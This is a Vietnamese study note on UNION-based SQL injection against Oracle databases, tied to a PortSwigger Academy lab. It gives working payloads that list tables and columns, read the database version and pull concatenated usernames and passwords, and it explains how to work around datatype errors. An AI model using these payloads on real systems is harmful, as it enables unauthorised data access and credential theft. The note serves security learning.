# SQL Injection UNION khi server là Oracle SQL
- Ở Oracle luôn bắt buộc phải có `FROM` khi query không như MySQL
```
-- MySQL: hợp lệ
SELECT 1

-- Oracle: LỖI — phải có FROM
SELECT 1
-- Phải viết:
SELECT 1 FROM dual
```
- Với table `dual` luôn được built-in nên chúng ta luôn có thể tận dụng nó khi chèn injection
- Oracle dùng các bảng hệ thống riêng:

```sql
-- Liệt kê các bảng
' UNION SELECT table_name, NULL FROM all_tables--

-- Liệt kê cột của 1 bảng cụ thể
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--

-- Lấy version Oracle
' UNION SELECT banner, NULL FROM v$version--
```
- Ghép chuỗi (concat) cũng khác với MySQL
```sql
-- MySQL: CONCAT(a,b)
-- Oracle: dùng ||
' UNION SELECT username || ':' || password, NULL FROM users--
```
- Và khi UNION SELECT tùy theo kiểu dữ liệu cột ở phần SELECT trước đó là gì thì UNION SELECT cũng sẽ theo dạng đó ví dụ
- Nếu câu query gốc trông như thế này:

```sql
SELECT username FROM users WHERE id = '$input'
```

+Và cột `username` là kiểu `VARCHAR2` (text) — thì khi bạn chèn:

```sql
' UNION SELECT 1 FROM dual--
```

+Oracle sẽ báo lỗi dạng:

```
ORA-01790: expression must have same datatype as corresponding expression
```

Vì chúng ta đang cố "ghép" một số nguyên (`1`) vào vị trí cột vốn là text.

- Cách khắc phục:

```sql
' UNION SELECT 'a' FROM dual--
```

Đổi `1` thành `'a'` (chuỗi) để khớp kiểu dữ liệu với cột text gốc → lỗi biến mất.

- Vậy quy tắc là gì

| Tình huống                       | Cách viết                                                                           |
| -------------------------------- | ----------------------------------------------------------------------------------- |
| Cột gốc là kiểu **số**           | `UNION SELECT 1 FROM dual` — OK                                                     |
| Cột gốc là kiểu **text/varchar** | `UNION SELECT 'a' FROM dual` — phải dùng chuỗi                                      |
| Không biết chắc kiểu cột         | Thử cả `NULL` — `NULL` tương thích với **mọi kiểu dữ liệu** nên an toàn nhất khi dò |
- Các lab trùng với case này
- [SQL injection attack, querying the database type and version on Oracle](../../../01-Writeups/PortSwigger%20Academy/SQL%20Injection/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20Oracle.md)
